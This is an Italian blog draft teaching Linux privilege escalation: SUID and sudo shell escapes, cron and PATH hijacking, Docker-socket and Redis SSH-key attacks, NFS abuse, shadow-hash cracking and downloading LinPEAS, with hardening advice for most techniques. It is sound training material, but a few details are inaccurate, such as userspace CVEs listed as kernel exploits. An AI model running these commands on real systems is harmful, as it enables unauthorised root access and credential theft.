---
date: 2026-07-13
categories:
  - Sicurezza Informatica
draft: true
---

# Linux Privilege Escalation — Guida Completa

## Premessa

La privilege escalation è il passaggio da un utente con privilegi limitati a **root** (o a un utente con più privilegi). Si divide in due categorie:

| Tipo | Come funziona |
|------|---------------|
| **Verticale** | Da user normale → root |
| **Orizzontale** | Da user A → user B (stessi privilegi, dati diversi) |

---

## 1. Kernel Exploit

### Cos'è
Il kernel Linux ha avuto centinaia di vulnerabilità che permettono escalation a root. Se il kernel non è patchato, puoi sfruttare una CVE.

### Come verificare
```bash
uname -r
# Esempio output: 2.6.24-16-generic
```

### CVE famose
| CVE | Kernel | Descrizione |
|-----|--------|-------------|
| CVE-2009-1185 | 2.6.x | UDEV privilege escalation |
| CVE-2010-4258 | 2.6.x | Full Nelson (do_brk) |
| CVE-2016-5195 | 2.6.22-4.4.8 | Dirty COW (copy-on-write) |
| CVE-2021-4034 | 5.x | PwnKit (polkit) |
| CVE-2021-3156 | 5.x | Baron Samedit (sudo) |

### Come sfruttare
```bash
# Cerca exploit per il kernel del target
searchsploit linux 2.6.24
# Oppure online: https://www.exploit-db.com/

# Scarica, compila, esegui
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

### Come difendersi
- Patch regolari del kernel
- `sysctl kernel.kptr_restrict=1` (nasconde indirizzi kernel)
- `sysctl kernel.dmesg_restrict=1` (limita output dmesg)

---

## 2. SUID Binaries

### Cos'è
Un file con il bit SUID (Set User ID) viene eseguito con i privilegi del **proprietario**, non dell'utente che lo lancia. Se il proprietario è root, il binario gira come root.

### Come trovare SUID
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Output tipico
```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/find
/usr/bin/vim
/usr/bin/python3
/usr/bin/nmap
/usr/bin/bash
```

### Binari pericolosi (GTFOBins)
Molti binari di sistema possono essere abusati per escalation. Il sito [GTFOBins](https://gtfoBins.github.io/) li cataloga tutti.

#### find
```bash
# find esegue comandi come root
find /etc -name shadow -exec /bin/sh -p \;
# Oppure
find . -exec /bin/sh -p \; -quit
```

#### vim
```bash
vim -c ':!/bin/sh -p'
```

#### python
```bash
python -c 'import os; os.setuid(0); os.system("/bin/sh -p")'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```

#### nmap (versioni vecchie)
```bash
# Nmap < 5.50 aveva modalità interactive
nmap --interactive
nmap> !sh
```

#### bash
```bash
# Se bash è SUID (raro ma possibile)
bash -p
```

#### tar
```bash
tar cf /dev/null /root --checkpoint=1 --checkpoint-action=exec=/bin/sh -p
```

#### awk
```bash
awk 'BEGIN {system("/bin/sh -p")}'
```

### Come difendersi
- Rimuovere SUID da binari non necessari: `chmod u-s /usr/bin/find`
- Monitorare nuovi SUID: `find / -perm -4000 -type f -newer /var/log/last_check`
- Usare `nosuid` mount option su filesystem non critici

---

## 3. Sudo Misconfiguration

### Cos'è
Se un utente può eseguire comandi come root tramite sudo, può escalare.

### Come verificare
```bash
sudo -l
```

### Output tipico
```
User user1 may run the following commands on metasploitable:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /bin/bash
    (ALL) ALL
```

### Sfruttamento

#### Se puoi eseguire bash
```bash
sudo bash
```

#### Se puoi eseguire find
```bash
sudo find / -name test -exec /bin/sh -p \;
```

#### Se puoi eseguire vim
```bash
sudo vim -c ':!/bin/sh -p'
```

#### Se puoi eseguire python
```bash
sudo python -c 'import os; os.system("/bin/sh -p")'
```

#### Se puoi eseguire tar
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh -p
```

### Wildcard injection
Se sudo permette comandi con wildcard:
```bash
# sudo permette: /usr/bin/tar /var/log/*
# Crea file malevoli nella directory
touch /var/log/--checkpoint=1
touch /var/log/--checkpoint-action=exec=/bin/sh
# Quando tar viene eseguito, i file diventano flag → esegue la shell
```

### Come difendersi
- Limitare sudo solo ai comandi necessari
- Mai usare `(ALL) ALL` o `NOPASSWD`
- Usare `sudoedit` invece di editor come root
- Audit regolare: `grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/`

---

## 4. Cron Jobs

### Cos'è
I cron job sono task schedulati. Se un cron job gira come root e modifica un file scrivibile da user normale, puoi escalare.

### Come trovare cron job
```bash
crontab -l              # I tuoi cron
cat /etc/crontab        # Cron di sistema
ls -la /etc/cron.*      # Directory cron
cat /etc/cron.d/*       # Cron custom
```

### Sfruttamento

#### Scenario: cron modifica uno script scrivibile
```bash
# Trovi: * * * * * root /opt/backup.sh
ls -la /opt/backup.sh
# -rwxrwxrwx 1 root root 50 Mar 17 2010 /opt/backup.sh

# Modifichi lo script
echo '#!/bin/bash' > /opt/backup.sh
echo 'chmod 4755 /tmp/root_shell' >> /opt/backup.sh
echo 'cp /bin/bash /tmp/root_shell' >> /opt/backup.sh

# Aspetti il cron (max 1 minuto)
/tmp/root_shell -p
```

#### Scenario: cron esegue un comando con wildcard
```bash
# Trovi: * * * * * root cd /var/log && tar czf backup.tar.gz *
# Crei file malevoli
touch /var/log/--checkpoint=1
touch /var/log/--checkpoint-action=exec=/bin/sh -p
```

#### Scenario: cron esegue script in directory scrivibile
```bash
# Trovi: * * * * * root /tmp/cleanup.sh
# Ma /tmp è scrivibile da tutti
# Sostituisci lo script
echo '#!/bin/bash' > /tmp/cleanup.sh
echo '/bin/bash -p' >> /tmp/cleanup.sh
chmod +x /tmp/cleanup.sh
```

### Come difendersi
- Cron job solo in `/etc/crontab` (non in directory scrivibili)
- Script di proprietà di root, permessi `700`
- Mai usare wildcard in comandi cron
- Audit: `find /etc/cron* -type f -exec ls -la {} \;`

---

## 5. File e Directory con Permessi Errati

### File leggibili da tutti
```bash
# /etc/shadow leggibile?
cat /etc/shadow
# Se sì, hai gli hash password → crack con hashcat

# File di config con password?
grep -r "password" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
```

### Directory scrivibili da tutti
```bash
# Directory con permessi 777
find / -type d -perm 777 2>/dev/null

# Script in path scrivibili
echo $PATH
# Se /tmp o /home/user è nel PATH, puoi creare script malevoli
```

### Sfruttamento PATH hijacking
```bash
# Se un cron job o script SUID esegue "ls" senza path assoluto
# E /tmp è nel PATH prima di /bin

# Crei un fake ls
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash -p' >> /tmp/ls
chmod +x /tmp/ls

# Modifichi PATH
export PATH=/tmp:$PATH

# Quando lo script esegue "ls", gira la tua shell
```

### Come difendersi
- `/etc/shadow` deve essere `640` o `000`
- Mai `777` su directory di sistema
- PATH assoluto negli script (`/bin/ls`, non `ls`)
- Audit: `find / -perm -o+w -type f 2>/dev/null`

---

## 6. Credenziali Hardcoded

### Dove cercare
```bash
# File di config
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /var/www/ 2>/dev/null

# Script con credenziali
find / -name "*.sh" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.php" -exec grep -l "password" {} \; 2>/dev/null

# Database config
cat /var/www/dvwa/config/config.inc.php
cat /var/www/tikiwiki/db/local.php

# SSH keys
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# History file
cat ~/.bash_history
cat /root/.bash_history  # se leggibile
```

### Sfruttamento
```bash
# Trovi password in chiaro → prova su altri servizi
ssh user@localhost
su - root

# Hash da /etc/shadow → crack con hashcat
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

### Come difendersi
- Mai hardcoded password nel codice
- Usare variabili d'ambiente o vault (HashiCorp Vault, AWS Secrets Manager)
- `.bash_history` non leggibile da altri
- Ruotare credenziali regolarmente

---

## 7. Capabilities

### Cos'è
Le capabilities sono privilegi granulari del kernel. Un binario può avere una capability specifica senza essere SUID.

### Come trovare
```bash
getcap -r / 2>/dev/null
```

### Output tipico
```
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python3 = cap_setuid+ep
/usr/sbin/tcpdump = cap_net_raw,cap_net_admin+ep
```

### Sfruttamento
```bash
# python3 con cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# tar con cap_dac_read_search (legge qualsiasi file)
tar -cf /dev/shm/shadow.tar /etc/shadow

# openssl con cap_dac_read_search
openssl enc -in /etc/shadow -out /tmp/shadow
```

### Come difendersi
```bash
# Rimuovi capability non necessarie
setcap -r /usr/bin/python3
```

---

## 8. Servizi con Configurazioni Errate

### Docker socket
```bash
# Se /var/run/docker.sock è accessibile
docker run -v /:/host -it alpine chroot /host /bin/sh
# Hai root sull'host
```

### MySQL come root
```bash
# Se MySQL gira come root e hai accesso
mysql -u root
mysql> \! /bin/sh -p
```

### Redis senza auth
```bash
redis-cli
127.0.0.1:6379> config set dir /root/.ssh/
127.0.0.1:6379> config set dbfilename authorized_keys
127.0.0.1:6379> set mykey "\n\nssh-rsa AAAA...\n\n"
127.0.0.1:6379> save
# Ora puoi SSH come root
```

---

## 9. NFS no_root_squash

### Cos'è
Se NFS esporta una share con `no_root_squash`, root locale diventa root remoto.

### Come verificare
```bash
showmount -e <target>
```

### Sfruttamento
```bash
# Monta la share NFS
mkdir /tmp/nfs
mount -t nfs <target>:/export /tmp/nfs

# Crea un binario SUID
cp /bin/bash /tmp/nfs/root_shell
chmod 4755 /tmp/nfs/root_shell

# Esegui sul target
/tmp/root_shell -p
```

### Come difendersi
- Mai usare `no_root_squash`
- Restringere export a IP specifici
- Usare `root_squash` (default)

---

## 10. Tool Automatici

### LinPEAS
```bash
# Scarica
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Esegui
chmod +x linpeas.sh
./linpeas.sh
```

### LinEnum
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t
```

### pspy (monitora processi senza root)
```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```

### Cosa fanno
Scansionano automaticamente: SUID, sudo, cron, capabilities, servizi, credenziali, kernel version, e generano un report colorato con le vulnerabilità trovate.

---

## Workflow di Privilege Escalation

```bash
# 1. Chi sono e dove sono
whoami && id && hostname && uname -a && pwd

# 2. Cosa posso fare con sudo
sudo -l

# 3. SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 4. Cron jobs
cat /etc/crontab && ls -la /etc/cron.* && crontab -l

# 5. Credenziali
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
cat ~/.bash_history

# 6. Servizi in ascolto
netstat -tlnp

# 7. Capabilities
getcap -r / 2>/dev/null

# 8. NFS
showmount -e localhost

# 9. Kernel version
uname -r → cerca CVE
```

---

## Riepilogo Tecniche

| Tecnica | Difficoltà | Frequenza |
|---------|------------|-----------|
| Kernel exploit | Media | Comune |
| SUID binaries | Bassa | Molto comune |
| Sudo misconfig | Bassa | Molto comune |
| Cron jobs | Media | Comune |
| Credenziali hardcoded | Bassa | Comune |
| Capabilities | Media | Rara |
| NFS no_root_squash | Bassa | Rara |
| Docker socket | Bassa | Crescente |
| Redis senza auth | Bassa | Comune |
| PATH hijacking | Media | Rara |

---

## Come Difendersi (Riepilogo)

1. **Patch regolari** — kernel, servizi, applicazioni
2. **Principio del minimo privilegio** — ogni utente/processo ha solo i permessi necessari
3. **Audit periodico** — SUID, sudo, cron, capabilities
4. **Monitoraggio** — log centralizzati, alert su attività sospette
5. **Hardening** — disabilitare servizi non necessari, firewall, SELinux/AppArmor
6. **Secret management** — mai hardcoded, usare vault
7. **Network segmentation** — isolare servizi critici
